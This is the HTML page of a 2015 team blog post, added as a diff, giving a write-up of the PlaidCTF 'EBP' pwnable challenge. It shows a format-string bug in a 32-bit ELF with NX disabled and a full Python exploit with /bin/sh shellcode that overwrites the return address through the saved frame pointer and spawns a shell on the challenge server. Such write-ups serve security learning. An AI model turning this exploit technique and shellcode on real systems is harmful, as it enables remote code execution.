@@ -1,0 +1,448 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PlaidCTF CTF 2015 - EBP Writeup - GeeksSpeak Team Blog</title>
+  <meta name="author" content="GeeksSpeak">
+
+  
+  <meta name="description" content="PlaidCTF 2015 EBP Writeup
+Point = 160
+Category = Pwnable Unfortunately the CTF time for our team was completely under heavy pressure. but here is one &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="GeeksSpeak Team Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">GeeksSpeak Team Blog</a></h1>
+  
+    <h2>WriteUps and random thoughts</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="geeksspeak.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PlaidCTF CTF 2015 - EBP Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-04-20T22:40:13+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:40 pm</span></time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><strong>PlaidCTF 2015 EBP Writeup</strong><br/>
+<strong>Point = 160</strong><br/>
+<strong>Category = Pwnable</strong></p>
+
+<p>Unfortunately the CTF time for our team was completely under heavy pressure. but here is one i solved in my free time.</p>
+
+<blockquote><p>Category: Pwnable Points: 160 Solves: 157 Description:
+   nc 52.6.64.173 4545
+   Download: %p%o%o%p.</p></blockquote>
+
+<p>We are given an ELF file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+</span><span class='line'>ebp_a96f7231ab81e1b0d7fe24d660def25a.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped</span></code></pre></td></tr></table></div></figure>
+
+
+<p>first attempt peresented us that it&rsquo;s a Format String Vulenrability.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+</span><span class='line'>%p%p%p%p%p
+</span><span class='line'>0xa0x10xf76c40000xffec67180x804852c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We noticed that the binary is provided with disabled NX.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>checksec.sh --file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ebp_a96f7231ab81e1b0d7fe24d660def25a.elf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it was pretty simple to run our shellcode and execute proper command to read the flag.</p>
+
+<p>It was the time to see the binary. IDA showed us that the buggy function is <code>make_response</code> since no FMT was used.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int make_response()
+</span><span class='line'>{
+</span><span class='line'>  return snprintf(response, 0x400u, buf);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>but <code>response</code> and <code>buf</code> are on <strong>BSS</strong> and we should change execution flow to this address <code>0x0804A480</code>.</p>
+
+<p>By dumping stack on executing <code>make_response</code> we had these values:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048503 in make_response ()
+</span><span class='line'>gdb-peda$ x/64wx $esp
+</span><span class='line'>0xffffcc30:     0xf7fadc20      0x0804a080      0x000003ff      0x0000000a
+</span><span class='line'>0xffffcc40:     0x00000001      0xf7fad000      0xffffcc68      0x0804852c
+</span><span class='line'>0xffffcc50:     0xffffcc88      0xf7ff04b0      0xffffccb4      0xf7fad000
+</span><span class='line'>0xffffcc60:     0x00000000      0x00000000      0xffffcc88      0x08048557
+</span><span class='line'>0xffffcc70:     0x0804a080      0x00000400      0xf7fadc20      0xf7fad000
+</span><span class='line'>0xffffcc80:     0x08048580      0x00000000      0x00000000      0xf7e1da83
+</span><span class='line'>0xffffcc90:     0x00000001      0xffffcd24      0xffffcd2c      0xf7feac9a
+</span><span class='line'>0xffffcca0:     0x00000001      0xffffcd24      0xffffccc4      0x0804a01c
+</span><span class='line'>0xffffccb0:     0x08048278      0xf7fad000      0x00000000      0x00000000
+</span><span class='line'>0xffffccc0:     0x00000000      0xb9b964cc      0x8594c0dc      0x00000000
+</span><span class='line'>0xffffccd0:     0x00000000      0x00000000      0x00000001      0x08048400
+</span><span class='line'>0xffffcce0:     0x00000000      0xf7ff04b0      0xf7e1d999      0xf7ffd000
+</span><span class='line'>0xffffccf0:     0x00000001      0x08048400      0x00000000      0x08048421
+</span><span class='line'>0xffffcd00:     0x08048547      0x00000001      0xffffcd24      0x08048580
+</span><span class='line'>0xffffcd10:     0x080485f0      0xf7feb130      0xffffcd1c      0x0000001c
+</span><span class='line'>0xffffcd20:     0x00000001      0xffffcf57      0x00000000      0xffffcf96</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You may notice that to overwriting a value via FMT vuln we should provide an address to <code>%n</code>. but we had just BSS variables so we should make this environment manually. As name of the challenge suggets we can use saved frame pointer since it has address of this frame. The scenario is pretty simple:</p>
+
+<ol>
+<li>leak an stack address to find location of RET address of current function <code>make_response</code>.</li>
+<li>overwrite RET address in place of saved frame pointer (which ebp points to it).</li>
+<li>again using a format string overwrite RET with <code>response</code> address.</li>
+</ol>
+
+
+<p>You should notice that we should write 2 least significant byte of ebp address location (%hhn).</p>
+
+<p>TL;DR</p>
+
+<p>This is what i used as exploiting this challenge:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
+</span><span class='line'>import struct
+</span><span class='line'>import telnetlib
+</span><span class='line'>
+</span><span class='line'>response = 0x0804a480
+</span><span class='line'>
+</span><span class='line'>offset = 4 # saved frame pointer offset 
+</span><span class='line'>
+</span><span class='line'>shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php
+</span><span class='line'>  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
+</span><span class='line'>        "\x73\x68\x68\x2f\x62\x69\x6e\x54"
+</span><span class='line'>        "\x5b\x52\x53\x54\x59\x0f\x34"
+</span><span class='line'>)
+</span><span class='line'>
+</span><span class='line'>s = socket.create_connection(("52.6.64.173", 4545 ))
+</span><span class='line'>#s = socket.create_connection(("127.0.0.1", 8080 ))
+</span><span class='line'>s.send("%4$p\n")
+</span><span class='line'>addr = int(s.recv(1024), 16)
+</span><span class='line'>print "[+] Leaked Address: ", hex(addr)
+</span><span class='line'>addr1 = (addr - 0x1c) & 0xffff
+</span><span class='line'>print "[+] 2Byte Significant Byte to write : ", hex(addr1) 
+</span><span class='line'>
+</span><span class='line'>s.send("%"+str(addr1)+"x%"+str(offset)+"$hn\n")
+</span><span class='line'>s.recv(4096)
+</span><span class='line'>
+</span><span class='line'>s.send(shellcode+"%"+str((response & 0xffff)-len(shellcode))+"x%"+str(12)+"$hn\n")
+</span><span class='line'>print "[+] Here you go"
+</span><span class='line'>t = telnetlib.Telnet()
+</span><span class='line'>t.sock = s
+</span><span class='line'>t.interact()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>running the exploit we have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python 5.py 
+</span><span class='line'>[+] Leaked Address:  0xffbea7c8
+</span><span class='line'>[+] 2Byte Significant Byte to write :  0xa7ac
+</span><span class='line'>[+] Here you go
+</span><span class='line'>cat /home/problem/flag.txt
+</span><span class='line'>who_needs_stack_control_anyway?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we&rsquo;ve got 160 point.</p>
+
+<p>@HAMIDx9</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">GeeksSpeak</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-04-20T22:40:13+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:40 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/fmt/'>fmt</a>, <a class='category' href='/blog/categories/plaidctf/'>plaidctf</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/" data-via="" data-counturl="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/" title="Previous Post: NDH CTF 2015 - Weshgrow Writeup">&laquo; NDH CTF 2015 - Weshgrow Writeup</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/">PlaidCTF CTF 2015 - EBP Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/">NDH CTF 2015 - Weshgrow Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/">NDH CTF 2015 - Facesec Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/">NDH CTF 2015 - Cooper Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/05/ndh-ctf-2015-private-writeup/">NDH CTF 2015 - Private Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  
+  <a href="https://github.com/GeeksSpeak">@GeeksSpeak</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'GeeksSpeak',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - GeeksSpeak -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'geeksspeak';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/';
+        var disqus_url = 'http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
